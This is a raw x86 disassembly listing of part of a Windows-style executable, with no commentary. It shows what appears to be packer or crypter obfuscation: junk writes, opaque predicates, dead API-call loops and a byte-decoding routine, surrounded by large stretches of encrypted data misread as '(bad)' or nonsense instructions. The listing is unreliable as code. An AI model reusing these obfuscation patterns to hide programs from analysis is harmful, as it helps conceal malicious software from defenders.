  40f20e:	mov    ds:0xd1f9fc6b,eax
  40f213:	ins    DWORD PTR es:[edi],dx
  40f214:	pop    edx
  40f215:	xor    BYTE PTR [eax+0xb],ah
  40f218:	add    DWORD PTR [edi],edx
  40f21a:	mov    esp,0x5fcd6296
  40f21f:	and    al,0x53
  40f221:	push   es
  40f222:	test   BYTE PTR [edx],al
  40f224:	shr    DWORD PTR [edx],0x6c
  40f227:	test   eax,0x904c4a28
  40f22c:	cmp    eax,0xc96db4f7
  40f231:	sti    
  40f232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f233:	jmp    0x40f1bd
  40f235:	gs das 
  40f237:	retf   0xbff8
  40f23a:	je     0x40f1ca
  40f23c:	pop    ecx
  40f23d:	or     al,0xba
  40f23f:	je     0x40f1d6
  40f241:	mov    al,ds:0xd7158157
  40f246:	test   DWORD PTR [edx+0x0],eax
  40f249:	scas   al,BYTE PTR es:[edi]
  40f24a:	jp     0x40f24c
  40f24c:	add    BYTE PTR [ebx-0x31fcef83],cl
  40f252:	mov    DWORD PTR ds:0x4285ff,0x246a
  40f25c:	cmp    ecx,edi
  40f25e:	mov    DWORD PTR ds:0x428627,0x3e93
  40f268:	je     0x40f379
  40f26e:	xor    edi,edi
  40f270:	mov    ecx,DWORD PTR [ebp-0x4]
  40f273:	not    edi
  40f275:	mov    edi,DWORD PTR [ebp+0x10]
  40f278:	sub    DWORD PTR ds:0x42863f,0x4adb
  40f282:	xor    eax,eax
  40f284:	adc    DWORD PTR ds:0x42865f,0x6085
  40f28e:	xor    ecx,edx
  40f290:	xor    DWORD PTR ds:0x42860b,0x42862f
  40f29a:	add    ecx,esi
  40f29c:	xor    DWORD PTR ds:0x4285d7,0x24ca
  40f2a6:	add    edi,0xfabdbedd
  40f2ac:	not    DWORD PTR ds:0x428617
  40f2b2:	adc    eax,0xffffffff
  40f2b5:	xor    eax,0x0
  40f2b8:	and    DWORD PTR ds:0x428663,0x428617
  40f2c2:	mov    DWORD PTR [ebp-0xc],eax
  40f2c5:	or     DWORD PTR ds:0x42866f,0x42864f
  40f2cf:	push   ebx
  40f2d0:	add    DWORD PTR ds:0x428647,ecx
  40f2d6:	xor    ebx,ebx
  40f2d8:	xor    edi,0x8a29a137
  40f2de:	mov    eax,ecx
  40f2e0:	add    eax,0xfabdbedd
  40f2e5:	adc    ebx,0xffffffff
  40f2e8:	xor    eax,0x8a29a137
  40f2ed:	xor    ebx,0x0
  40f2f0:	cmp    eax,edi
  40f2f2:	jne    0x40f30b
  40f2f8:	cmp    ebx,DWORD PTR [ebp-0xc]
  40f2fb:	je     0x40f373
  40f301:	jmp    0x40f30b
  40f306:	mov    esi,0x3272ec
  40f30b:	mov    eax,DWORD PTR [ebp-0x4]
  40f30e:	mov    edi,DWORD PTR [ebp-0x8]
  40f311:	xor    edi,edx
  40f313:	add    edi,esi
  40f315:	mov    esi,DWORD PTR [ebp+0x8]
  40f318:	imul   edi,ecx
  40f31b:	mov    ebx,DWORD PTR [ebp+0xc]
  40f31e:	xor    eax,edx
  40f320:	add    eax,ecx
  40f322:	mov    al,BYTE PTR [ebx+eax*1+0x3272ec]
  40f329:	mov    BYTE PTR [edi+esi*1],al
  40f32c:	mov    eax,DWORD PTR [ebp-0x8]
  40f32f:	mov    esi,DWORD PTR [ebp+0x10]
  40f332:	xor    eax,edx
  40f334:	xor    ebx,ebx
  40f336:	add    esi,0xfabdbedd
  40f33c:	adc    ebx,0xffffffff
  40f33f:	lea    ecx,[ecx+eax*1+0x3272ec]
  40f346:	xor    edi,edi
  40f348:	xor    esi,0x8a29a137
  40f34e:	xor    ebx,0x0
  40f351:	mov    eax,ecx
  40f353:	add    eax,0xfabdbedd
  40f358:	adc    edi,0xffffffff
  40f35b:	xor    eax,0x8a29a137
  40f360:	xor    edi,0x0
  40f363:	cmp    eax,esi
  40f365:	jne    0x40f306
  40f36b:	cmp    edi,ebx
  40f36d:	jne    0x40f306
  40f373:	mov    eax,0xf89c85b1
  40f378:	pop    ebx
  40f379:	pop    edi
  40f37a:	pop    esi
  40f37b:	leave  
  40f37c:	ret    0xc
  40f37f:	push   ebp
  40f380:	mov    ebp,esp
  40f382:	push   ecx
  40f383:	xor    DWORD PTR ds:0x428677,0x1e97
  40f38d:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  40f394:	dec    edx
  40f395:	mov    eax,DWORD PTR [ebp-0x4]
  40f398:	or     DWORD PTR ds:0x42862f,0x2902
  40f3a2:	mov    edx,DWORD PTR [ebp+0x10]
  40f3a5:	mov    ecx,0x75108a4
  40f3aa:	adc    DWORD PTR ds:0x428677,0x428657
  40f3b4:	xor    eax,ecx
  40f3b6:	add    eax,0x3272ec
  40f3bb:	or     DWORD PTR ds:0x42866b,0x4f38
  40f3c5:	mov    DWORD PTR [edx],eax
  40f3c7:	and    DWORD PTR ds:0x428603,0x0
  40f3d1:	jmp    0x40f3e1
  40f3d6:	mov    eax,ds:0x428603
  40f3db:	inc    eax
  40f3dc:	mov    ds:0x428603,eax
  40f3e1:	cmp    DWORD PTR ds:0x428603,0x17
  40f3e8:	jae    0x40f42d
  40f3ee:	cmp    DWORD PTR ds:0x428603,0x5
  40f3f5:	jge    0x40f42d
  40f3fb:	jmp    0x40f410
  40f400:	push   0x8c16
  40f405:	push   0x428617
  40f40a:	call   DWORD PTR ds:0x4287b3
  40f410:	cmp    DWORD PTR ds:0x428603,0x4
  40f417:	jne    0x40f428
  40f41d:	mov    eax,ds:0x428603
  40f422:	inc    eax
  40f423:	mov    ds:0x428603,eax
  40f428:	jmp    0x40f3d6
  40f42d:	mov    eax,DWORD PTR [ebp+0xc]
  40f430:	xor    eax,ecx
  40f432:	push   esi
  40f433:	mov    esi,DWORD PTR [ebp+0x10]
  40f436:	mov    edx,0x3272ec
  40f43b:	add    eax,edx
  40f43d:	mov    DWORD PTR [esi+0x4],eax
  40f440:	mov    eax,DWORD PTR [ebp+0x14]
  40f443:	mov    esi,DWORD PTR [ebp+0x10]
  40f446:	mov    DWORD PTR [esi+0x8],eax
  40f449:	mov    eax,DWORD PTR [ebp+0x18]
  40f44c:	mov    esi,DWORD PTR [ebp+0x10]
  40f44f:	mov    DWORD PTR [esi+0xc],eax
  40f452:	mov    eax,DWORD PTR [ebp+0x1c]
  40f455:	mov    esi,DWORD PTR [ebp+0x10]
  40f458:	mov    DWORD PTR [esi+0x10],eax
  40f45b:	mov    eax,DWORD PTR [ebp+0x8]
  40f45e:	xor    eax,ecx
  40f460:	add    eax,edx
  40f462:	pop    esi
  40f463:	leave  
  40f464:	ret    0x18
  40f467:	push   ebp
  40f468:	mov    ebp,esp
  40f46a:	sub    esp,0x9c
  40f470:	dec    ecx
  40f471:	mov    ecx,DWORD PTR [ebp+0x8]
  40f474:	mov    eax,0x8a94
  40f479:	sbb    DWORD PTR ds:0x428677,0x4285eb
  40f483:	xor    ax,WORD PTR [ecx+0x20]
  40f487:	mov    ecx,DWORD PTR ds:0x42864b
  40f48d:	sub    ecx,DWORD PTR ds:0x428673
  40f493:	mov    DWORD PTR ds:0x42864b,ecx
  40f499:	mov    ecx,0x3b56
  40f49e:	add    ax,cx
  40f4a1:	movzx  eax,ax
  40f4a4:	and    DWORD PTR ds:0x42865f,0x0
  40f4ae:	jmp    0x40f4c0
  40f4b3:	mov    ecx,DWORD PTR ds:0x42865f
  40f4b9:	inc    ecx
  40f4ba:	mov    DWORD PTR ds:0x42865f,ecx
  40f4c0:	cmp    DWORD PTR ds:0x42865f,0x11
  40f4c7:	jae    0x40f4ea
  40f4cd:	cmp    DWORD PTR ds:0x42865f,0x17
  40f4d4:	jge    0x40f4ea
  40f4da:	jmp    0x40f4e5
  40f4df:	call   DWORD PTR ds:0x4287b7
  40f4e5:	jmp    0x40f4b3
  40f4ea:	mov    DWORD PTR [ebp-0x10],eax
  40f4ed:	mov    BYTE PTR [ebp-0x1],0x7d
  40f4f1:	and    DWORD PTR ds:0x42863b,0x0
  40f4fb:	jmp    0x40f50d
  40f500:	mov    ecx,DWORD PTR ds:0x42863b
  40f506:	inc    ecx
  40f507:	mov    DWORD PTR ds:0x42863b,ecx
  40f50d:	cmp    DWORD PTR ds:0x42863b,0x11
  40f514:	jae    0x40f53a
  40f51a:	cmp    DWORD PTR ds:0x42863b,0x14
  40f521:	jg     0x40f53a
  40f527:	jmp    0x40f535
  40f52c:	push   DWORD PTR [ebp-0x1c]
  40f52f:	call   DWORD PTR ds:0x4287bb
  40f535:	jmp    0x40f500
  40f53a:	lea    eax,[ebp-0x1]
  40f53d:	xor    DWORD PTR ds:0x4285d7,0x262c
  40f547:	mov    DWORD PTR [ebp-0xc],eax
  40f54a:	inc    ecx
  40f54b:	mov    al,BYTE PTR [ebp-0x1]
  40f54e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f551:	xor    al,0x79
  40f553:	sub    al,0x3
  40f555:	mov    BYTE PTR [ecx],al
  40f557:	mov    DWORD PTR [ebp-0x18],0xf89c85b0
  40f55e:	mov    eax,ds:0x428697
  40f563:	mov    ecx,DWORD PTR ds:0x4286db
  40f569:	sub    ecx,eax
  40f56b:	add    eax,DWORD PTR [eax+ecx*1]
  40f56e:	push   ebx
  40f56f:	and    DWORD PTR ds:0x428603,0x0
  40f579:	jmp    0x40f58c
  40f57e:	xor    eax,eax
  40f580:	add    eax,DWORD PTR ds:0x428603
  40f586:	inc    eax
  40f587:	mov    ds:0x428603,eax
  40f58c:	cmp    DWORD PTR ds:0x428603,0x10
  40f593:	jae    0x40f5e9
  40f599:	cmp    DWORD PTR ds:0x428603,0x7
  40f5a0:	jle    0x40f5e9
  40f5a6:	jmp    0x40f5c9
  40f5ab:	push   DWORD PTR [ebp-0x28]
  40f5ae:	push   0x428034
  40f5b3:	push   DWORD PTR [ebp-0x18]
  40f5b6:	push   0x428079
  40f5bb:	push   0x5a9e
  40f5c0:	push   DWORD PTR [ebp-0x14]
  40f5c3:	call   DWORD PTR ds:0x4287bf
  40f5c9:	cmp    DWORD PTR ds:0x428603,0x6
  40f5d0:	jne    0x40f5e4
  40f5d6:	xor    eax,eax
  40f5d8:	xor    eax,DWORD PTR ds:0x428603
  40f5de:	inc    eax
  40f5df:	mov    ds:0x428603,eax
  40f5e4:	jmp    0x40f57e
  40f5e9:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40f5f0:	sbb    DWORD PTR ds:0x42861b,ecx
  40f5f6:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5f9:	push   esi
  40f5fa:	mov    eax,0x75108a4
  40f5ff:	xor    esi,esi
  40f601:	or     esi,DWORD PTR ds:0x42869f
  40f607:	mov    esi,DWORD PTR [esi]
  40f609:	or     DWORD PTR ds:0x428633,esi
  40f60f:	xor    ecx,eax
  40f611:	xor    DWORD PTR ds:0x428613,ebx
  40f617:	mov    esi,0x3272ec
  40f61c:	push   edi
  40f61d:	or     DWORD PTR ds:0x4285ef,0x42867b
  40f627:	add    ecx,esi
  40f629:	mov    DWORD PTR ds:0x42867b,0x3def
  40f633:	jmp    0x40f64d
  40f638:	mov    DWORD PTR ds:0x428633,0x70a7
  40f642:	mov    dl,BYTE PTR [ebp-0x1]
  40f645:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f64c:	inc    ecx
  40f64d:	mov    DWORD PTR ds:0x4285ef,0x74bd
  40f657:	cmp    ecx,0x40
  40f65a:	mov    DWORD PTR ds:0x42865f,0x4046
  40f664:	jb     0x40f638
  40f66a:	adc    edx,0xe49
  40f670:	mov    edx,DWORD PTR [ebp-0x18]
  40f673:	xor    edx,eax
  40f675:	sub    DWORD PTR ds:0x4285d3,0x203c
  40f67f:	add    edx,esi
  40f681:	jmp    0x411adf
  40f686:	mov    edi,DWORD PTR [ebp+0x8]
  40f689:	jmp    0x411a2a
  40f68e:	sub    ah,al
  40f690:	xor    al,0xf6
  40f692:	test   al,0xa6
  40f694:	mov    al,ds:0x7e506298
  40f699:	mov    edx,DWORD PTR [esi]
  40f69b:	sub    DWORD PTR [edx],edx
  40f69d:	in     al,dx
  40f69e:	inc    edx
  40f69f:	mov    eax,ds:0x5ffe7a7a
  40f6a4:	jp     0x40f720
  40f6a6:	sbb    bh,dh
  40f6a8:	(bad)  
  40f6a9:	aam    0x69
  40f6ab:	or     al,BYTE PTR [eax]
  40f6ad:	jmp    0x40f71a
  40f6af:	mov    ecx,0x68461c9a
  40f6b4:	ins    BYTE PTR es:[edi],dx
  40f6b5:	jne    0x40f705
  40f6b7:	pop    eax
  40f6b8:	cli    
  40f6b9:	and    DWORD PTR [ecx],esp
  40f6bb:	add    eax,0x4385da71
  40f6c0:	test   al,0x4
  40f6c2:	das    
  40f6c3:	sub    esp,DWORD PTR [ecx+0x72]
  40f6c6:	rcr    ah,0xd9
  40f6c9:	in     eax,0xfc
  40f6cb:	sbb    esi,0xffffff8d
  40f6ce:	lahf   
  40f6cf:	xchg   DWORD PTR [eax+ebp*4],esp
  40f6d2:	inc    ebp
  40f6d3:	pop    edx
  40f6d4:	loop   0x40f660
  40f6d6:	dec    ebx
  40f6d7:	xchg   esp,eax
  40f6d8:	xchg   ebx,eax
  40f6d9:	sub    al,0x18
  40f6db:	loop   0x40f693
  40f6dd:	mov    ch,0x69
  40f6df:	mov    ebx,0x48de3b2
  40f6e4:	(bad)  
  40f6e5:	jmp    0x4c8b2590
  40f6ea:	fdivrp st(4),st
  40f6ec:	addr16 lock pop ecx
  40f6ef:	ds in  al,dx
  40f6f1:	and    al,0xf4
  40f6f3:	lods   al,BYTE PTR ds:[esi]
  40f6f4:	(bad)  
  40f6f5:	sahf   
  40f6f6:	inc    ebp
  40f6f7:	(bad)  
  40f6f8:	fdivr  DWORD PTR [ebx-0x13cfda5f]
  40f6fe:	inc    edx
  40f6ff:	ds pop ss
  40f701:	jmp    0xb013:0x2a1af70a
  40f708:	xor    ebx,DWORD PTR [ecx-0x4ae6fef3]
  40f70e:	out    0x19,al
  40f710:	add    DWORD PTR [edx],edi
  40f712:	inc    ecx
  40f713:	adc    eax,eax
  40f715:	aas    
  40f716:	js     0x40f6ee
  40f718:	loop   0x40f775
  40f71a:	adc    bl,bh
  40f71c:	pop    eax
  40f71d:	xor    edx,eax
  40f71f:	push   0xffffffea
  40f721:	imul   esi,ebx,0x44
  40f724:	fcomp  DWORD PTR [ebp+0x6e]
  40f727:	stos   DWORD PTR es:[edi],eax
  40f728:	bnd jne 0x40f785
  40f72b:	in     eax,0xf9
  40f72d:	push   ecx
  40f72e:	data16 ja 0x40f6e9
  40f731:	jmp    0x108e8c96
  40f736:	add    eax,0xb21c4f73
  40f73b:	(bad)  
  40f73d:	cli    
  40f73e:	daa    
  40f73f:	and    al,0xe7
  40f741:	int    0xf5
  40f743:	mov    eax,0x10c3bc4d
  40f748:	scas   eax,DWORD PTR es:[edi]
  40f749:	mov    edx,0xcbb2a69e
  40f74e:	cld    
  40f74f:	mov    ebp,0x491eea78
  40f754:	stos   BYTE PTR es:[edi],al
  40f755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f756:	or     ecx,DWORD PTR [eax+edi*4+0xb]
  40f75a:	shl    DWORD PTR [edx+0x742d4a1c],1
  40f760:	ror    BYTE PTR [edi-0x11],1
  40f763:	fisttp QWORD PTR [ecx+edi*2-0x7f]
  40f767:	daa    
  40f768:	jp     0x40f743
  40f76a:	loopne 0x40f716
  40f76c:	in     eax,dx
  40f76d:	(bad)  
  40f76e:	fs push ebx
  40f770:	(bad)  
  40f772:	adc    al,0x75
  40f774:	aas    
  40f775:	(bad)  [edi+edi*8-0x58e6b915]
  40f77c:	and    BYTE PTR [edx-0x2e],bh
  40f77f:	mov    bl,0x7f
  40f781:	push   0xffffffe3
  40f783:	mov    ebp,0x22eec16e
  40f788:	jns    0x40f7fd
  40f78a:	xchg   esi,eax
  40f78b:	mov    WORD PTR gs:[edx+0x37d30964],fs
  40f792:	fwait
  40f793:	rcr    DWORD PTR [eax+eax*1-0x7d],0xf6
  40f798:	idiv   DWORD PTR [edi+0x32cd7fe4]
  40f79e:	arpl   di,bx
  40f7a0:	sub    edi,ecx
  40f7a2:	ss cmp esi,ebx
  40f7a5:	xor    esi,esp
  40f7a7:	xchg   edx,eax
  40f7a8:	(bad)  
  40f7a9:	and    edx,DWORD PTR [ebx+ebp*2+0x71]
  40f7ad:	or     eax,0xa24e1f83
  40f7b2:	xchg   ebp,eax
  40f7b3:	repnz cmc 
  40f7b5:	outs   dx,BYTE PTR ds:[esi]
  40f7b6:	pop    es
  40f7b7:	out    dx,al
  40f7b8:	or     ebx,DWORD PTR [ebp+0x22]
  40f7bb:	in     eax,dx
  40f7bc:	inc    edi
  40f7bd:	xor    DWORD PTR [esi],ebx
  40f7bf:	mov    cl,BYTE PTR ds:0x139a8322
  40f7c5:	jmp    0x11c4f4cb
  40f7ca:	jae    0x40f839
  40f7cc:	push   0x41
  40f7ce:	leave  
  40f7cf:	dec    ebx
  40f7d0:	mov    ?,WORD PTR [esi]
  40f7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d3:	adc    eax,0xe49627e2
  40f7d8:	test   BYTE PTR [ebx+eax*4-0xc],0xdf
  40f7dd:	xor    cl,bh
  40f7df:	test   al,0x4a
  40f7e1:	call   FWORD PTR [edx+eax*8+0x5bac62b6]
  40f7e8:	test   DWORD PTR [ebx-0x5bd8a8a7],0x2f68f81b
  40f7f2:	mov    dh,BYTE PTR [esi-0x73]
  40f7f5:	jae    0x40f808
  40f7f7:	fsub   st(0),st
  40f7f9:	lods   eax,DWORD PTR ds:[esi]
  40f7fa:	outs   dx,DWORD PTR ds:[esi]
  40f7fb:	jae    0x40f7c5
  40f7fd:	xor    edi,edx
  40f7ff:	jge    0x40f81a
  40f801:	push   cs
  40f802:	inc    edx
  40f803:	stc    
  40f804:	fisttp DWORD PTR [esi+0x27]
  40f807:	cmp    BYTE PTR cs:[ecx],0x7f
  40f80b:	push   ebx
  40f80c:	jmp    0xc250:0xab49e309
  40f813:	push   es
  40f814:	mov    edx,0xbf3a7f39
  40f819:	out    0x91,eax
  40f81b:	rdmsr  
  40f81d:	sbb    al,0x39
  40f81f:	push   ecx
  40f820:	js     0x40f865
  40f822:	jbe    0x40f84b
  40f824:	adc    ecx,ebx
  40f826:	ins    BYTE PTR es:[edi],dx
  40f827:	in     eax,0x71
  40f829:	push   ebx
  40f82a:	pop    eax
  40f82b:	sub    eax,0xbdeb0605
  40f830:	mov    al,ds:0x51c36e07
  40f835:	test   DWORD PTR [ecx+ebp*1+0x9d94b64],0x3b55e5fb
  40f840:	gs in  al,dx
  40f842:	sub    BYTE PTR [eax],dh
  40f844:	jl     0x40f876
  40f846:	jbe    0x40f81d
  40f848:	lock mov ebp,0x3fbb1229
  40f84e:	test   DWORD PTR [ebp+0x52d0fc09],edx
  40f854:	dec    edi
  40f855:	call   0x82e42e21
  40f85a:	jmp    0x7835:0x24591017
  40f861:	aas    
  40f862:	and    eax,DWORD PTR [edx]
  40f864:	(bad)  
  40f865:	ret    
  40f866:	sti    
  40f867:	add    DWORD PTR [ebx-0x1148e88],0xffffffb5
  40f86e:	sub    al,0x26
  40f870:	arpl   WORD PTR [esi-0x1e],bp
  40f873:	jle    0x40f84f
  40f875:	mov    ds:0xcb64b8ba,eax
  40f87a:	jp     0x40f88a
  40f87c:	adc    DWORD PTR [edx],edi
  40f87e:	xchg   edx,eax
  40f87f:	push   0x45856649
  40f884:	shl    BYTE PTR ds:0x7ec44a2d,cl
  40f88a:	mov    al,0xbb
  40f88c:	sub    BYTE PTR [ebp-0x3c],al
  40f88f:	inc    ebp
  40f890:	cli    
  40f891:	scas   al,BYTE PTR es:[edi]
  40f892:	inc    ebx
  40f893:	sbb    bl,BYTE PTR [ebx-0x139eb8b0]
  40f899:	ins    DWORD PTR es:[edi],dx
  40f89a:	mov    ecx,0xe36232ff
  40f89f:	xor    DWORD PTR [esi+edi*2],edx
  40f8a2:	(bad)  
  40f8a3:	lahf   
  40f8a4:	scas   al,BYTE PTR es:[edi]
  40f8a5:	sbb    ecx,DWORD PTR [edi]
  40f8a7:	push   ss
  40f8a8:	push   es
  40f8a9:	leave  
  40f8aa:	mov    ch,0x2b
  40f8ac:	outs   dx,BYTE PTR ds:[esi]
  40f8ad:	or     DWORD PTR [ebx],esi
  40f8af:	dec    ebx
  40f8b0:	mov    edx,0x40c1d958
  40f8b5:	jo     0x40f88c
  40f8b7:	aad    0xf6
  40f8b9:	add    DWORD PTR [esi+0x5ddf669c],edi
  40f8bf:	imul   ebp,DWORD PTR [eax+0x72294e3c],0xffffffb5
  40f8c6:	cld    
  40f8c7:	(bad)  
  40f8c8:	mov    bh,0x8f
  40f8ca:	scas   al,BYTE PTR es:[edi]
  40f8cb:	dec    eax
  40f8cc:	pop    eax
  40f8cd:	or     ebp,DWORD PTR [ebx]
  40f8cf:	sub    dh,BYTE PTR [edi]
  40f8d1:	jnp    0x40f94f
  40f8d3:	ins    BYTE PTR es:[edi],dx
  40f8d4:	sahf   
  40f8d5:	jg     0x40f895
  40f8d7:	sbb    dl,BYTE PTR [eax]
  40f8d9:	mov    al,0xbd
  40f8db:	loopne 0x40f872
  40f8dd:	mov    eax,ds:0xedc11a16
  40f8e2:	mov    BYTE PTR [ecx],dh
  40f8e4:	lods   al,BYTE PTR ds:[esi]
  40f8e5:	iret   
  40f8e6:	mov    bl,BYTE PTR [ecx-0x6ed6a1a4]
  40f8ec:	mov    dl,BYTE PTR [eax-0x3529229]
  40f8f2:	push   ss
  40f8f3:	or     edi,DWORD PTR [ecx-0x67]
  40f8f6:	push   ecx
  40f8f7:	nop
  40f8f8:	lea    ebp,[ecx+0x44437cfd]
  40f8fe:	popa   
  40f8ff:	inc    ebp
  40f900:	fnstsw WORD PTR [edx-0x5ec93e94]
  40f906:	shl    DWORD PTR [ecx+0x625e8075],1
  40f90c:	fs jecxz 0x40f8f0
  40f90f:	sbb    BYTE PTR [edi],0x6e
  40f912:	imul   esp,DWORD PTR [eax-0x4e7372e5],0x11
  40f919:	xchg   ebp,eax
  40f91a:	jle    0x40f8c7
  40f91c:	push   0x4e66f400
  40f921:	push   es
  40f922:	adc    eax,DWORD PTR [esi+0xd]
  40f925:	pop    eax
  40f926:	dec    esp
  40f927:	outs   dx,BYTE PTR ds:[esi]
  40f928:	xchg   esp,esi
  40f92a:	pushf  
  40f92b:	ins    DWORD PTR es:[edi],dx
  40f92c:	dec    ecx
  40f92d:	out    dx,eax
  40f92e:	pop    ss
  40f92f:	stos   DWORD PTR es:[edi],eax
  40f930:	jg     0x40f8e1
  40f932:	fdiv   st(2),st
  40f934:	lods   eax,DWORD PTR ds:[esi]
  40f935:	jmp    0x7529:0x139d7f16
  40f93c:	lods   al,BYTE PTR ds:[esi]
  40f93e:	inc    BYTE PTR [eax-0x30]
  40f941:	xor    DWORD PTR [edx+0x7b13c7cb],ebx
  40f947:	hlt    
  40f948:	es call 0xe7f5:0x6027d154
  40f950:	lods   al,BYTE PTR ds:[esi]
  40f951:	stc    
  40f952:	int    0xeb
  40f954:	mov    cl,dl
  40f956:	push   ecx
  40f957:	dec    esi
  40f958:	shl    BYTE PTR [edi-0x6426ccda],1
  40f95e:	pusha  
  40f95f:	and    BYTE PTR [edx+0x2dbf42c],0x6c
  40f966:	dec    esi
  40f967:	cdq    
  40f968:	mov    dl,0xd4
  40f96a:	(bad)
  40f96d:	xor    BYTE PTR [ebx+esi*4-0x5a80b16a],cl
  40f974:	(bad)  
  40f975:	mov    ds:0x86e94996,al
  40f97a:	shl    DWORD PTR [edi+0x9c9cd0a],cl
  40f980:	pop    esp
  40f982:	xor    eax,0x96d4dde9
  40f987:	cmp    DWORD PTR [esi],ecx
  40f989:	retf   0xa028
  40f98c:	pop    ecx
  40f98d:	frstor [eax-0x686295ae]
  40f993:	and    DWORD PTR [edx],esi
  40f995:	in     eax,dx
  40f996:	xor    edx,esp
  40f998:	test   DWORD PTR [edx+0x65334295],ebp
  40f99e:	sbb    eax,0x4314592e
  40f9a3:	cs jnp 0x40f936
  40f9a6:	and    eax,0xf8ced742
  40f9ab:	aaa    
  40f9ac:	lea    eax,[ecx+0xa]
  40f9af:	mov    ecx,0xc026631c
  40f9b4:	daa    
  40f9b5:	dec    eax
  40f9b6:	loop   0x40f9de
  40f9b8:	mov    esp,0xdd40a7a7
  40f9bd:	loop   0x40f9c5
  40f9bf:	and    BYTE PTR [eax+0xc],0x1c
  40f9c3:	(bad)  
  40f9c4:	and    DWORD PTR [ebp+0x50eaf72e],esi
  40f9ca:	je     0x40fa1e
  40f9cc:	out    dx,al
  40f9cd:	jecxz  0x40f98d
  40f9cf:	xchg   BYTE PTR [ecx],al
  40f9d1:	adc    edx,eax
  40f9d3:	jns    0x40f9f5
  40f9d5:	stc    
  40f9d6:	or     ecx,esp
  40f9d8:	(bad)  
  40f9d9:	je     0x40f9e5
  40f9db:	push   eax
  40f9dc:	mov    al,ds:0xa25c525c
  40f9e1:	push   ebp
  40f9e2:	xchg   ebp,eax
  40f9e3:	push   0x1f
  40f9e5:	aam    0x3a
  40f9e7:	jecxz  0x40f9d2
  40f9e9:	sahf   
  40f9ea:	pop    eax
  40f9eb:	nop
  40f9ec:	loope  0x40fa14
  40f9ee:	push   ebp
  40f9ef:	aaa    
  40f9f0:	out    dx,eax
  40f9f1:	push   ds
  40f9f2:	xchg   ebx,eax
  40f9f3:	call   0xc891:0xfe5c8d93
  40f9fa:	das    
  40f9fb:	fstp   TBYTE PTR [esi-0x557f9fb4]
  40fa01:	imul   edx,DWORD PTR [esi+0x29b9ee62],0x67
  40fa08:	sar    DWORD PTR [eax+0x42],1
  40fa0b:	mov    edx,0x17c6bf92
  40fa10:	fnsave [esi-0x372b9287]
  40fa16:	xchg   ebp,eax
  40fa17:	or     ebp,esi
  40fa19:	into   
  40fa1a:	test   al,0xbd
  40fa1c:	sub    al,0x56
  40fa1e:	sahf   
  40fa1f:	mov    WORD PTR [eax-0x65cf033a],cs
  40fa25:	jbe    0x40fa88
  40fa27:	mov    WORD PTR [edi-0x7a9f2055],cs
  40fa2d:	retf   0xcc6f
  40fa30:	and    BYTE PTR [eax+esi*2+0x24],dl
  40fa34:	js     0x40fa59
  40fa36:	(bad)  [ecx]
  40fa38:	jecxz  0x40f9bb
  40fa3a:	dec    ebx
  40fa3c:	sub    DWORD PTR cs:[eax-0x3f],esp
  40fa40:	push   cs
  40fa41:	in     eax,0x46
  40fa43:	nop
  40fa44:	inc    eax
  40fa45:	push   ebx
  40fa46:	or     dl,ch
  40fa48:	add    DWORD PTR [ebx-0x43],edx
  40fa4b:	in     al,dx
  40fa4c:	add    eax,0x17ed0f7c
  40fa51:	xchg   ebp,eax
  40fa52:	pushf  
  40fa53:	jb     0x40f9f8
  40fa55:	cwde   
  40fa56:	cs scas al,BYTE PTR es:[edi]
  40fa58:	inc    edx
  40fa59:	xchg   ebx,eax
  40fa5a:	ficomp WORD PTR [ecx+eax*8]
  40fa5d:	jo     0x40fab3
  40fa5f:	mov    esp,0x291914c8
  40fa64:	jbe    0x40facb
  40fa66:	cmp    cl,dh
  40fa68:	arpl   WORD PTR [edi],bx
  40fa6a:	int3   
  40fa6b:	aaa    
  40fa6c:	pop    ebx
  40fa6d:	lods   al,BYTE PTR ds:[esi]
  40fa6e:	or     DWORD PTR [edx-0x61],edi
  40fa71:	jb     0x40fa11
  40fa73:	nop
  40fa74:	push   esi
  40fa75:	cmp    BYTE PTR [ecx+0x62452876],ch
  40fa7b:	xor    al,BYTE PTR [ebx]
  40fa7d:	inc    ebp
  40fa7e:	je     0x40fa33
  40fa80:	pop    esi
  40fa81:	les    edi,FWORD PTR [edi-0x1a96a405]
  40fa87:	sbb    ch,BYTE PTR [eax]
  40fa89:	add    al,0x5e
  40fa8b:	xor    BYTE PTR [ebx+0x14],bl
  40fa8e:	xchg   ecx,eax
  40fa8f:	and    eax,0x2e946480
  40fa94:	and    ch,BYTE PTR [edx]
  40fa96:	lock scas al,BYTE PTR es:[edi]
  40fa98:	test   BYTE PTR [eax-0x1b7080ea],ah
  40fa9e:	(bad)
  40faa2:	push   esp
  40faa3:	push   ebx
  40faa4:	xchg   edx,eax
  40faa5:	out    dx,al
  40faa6:	sub    eax,0x807a16ec
  40faab:	ds jbe 0x40fa5a
  40faae:	ins    BYTE PTR es:[edi],dx
  40faaf:	popa   
  40fab0:	ss in  eax,0x55
  40fab3:	xchg   ebx,eax
  40fab4:	lea    edx,[edi]
  40fab6:	sbb    BYTE PTR [edx+0x36d299da],cl
  40fabc:	int3   
  40fabd:	retf   0xe17d
  40fac0:	pushf  
  40fac1:	loopne 0x40fb34
  40fac3:	(bad)  
  40fac4:	fisubr DWORD PTR [edx]
  40fac6:	add    al,0x88
  40fac8:	pusha  
  40fac9:	clc    
  40faca:	dec    esp
  40facb:	loope  0x40fb18
  40facd:	icebp  
  40face:	and    eax,0x8488e92b
  40fad3:	and    DWORD PTR [ecx-0x49fc38d6],ebp
  40fad9:	mov    ch,0xb9
  40fadb:	gs inc esi
  40fadd:	push   0xffffffc6
  40fadf:	sub    ebx,ebp
  40fae1:	push   eax
  40fae2:	test   DWORD PTR [ebx-0x9],eax
  40fae5:	std    
  40fae6:	cmp    eax,0x6dcc41d4
  40faeb:	cmp    al,0x57
  40faed:	rcl    BYTE PTR [esp+esi*1+0x41],1
  40faf1:	xlat   BYTE PTR ds:[ebx]
  40faf2:	jne    0x40fb0a
  40faf4:	scas   eax,DWORD PTR es:[edi]
  40faf5:	add    DWORD PTR [edx],ebp
  40faf7:	xchg   ecx,eax
  40faf8:	pop    eax
  40faf9:	inc    ecx
  40fafa:	or     DWORD PTR [edi+0x5e],eax
  40fafd:	psadbw mm4,mm0
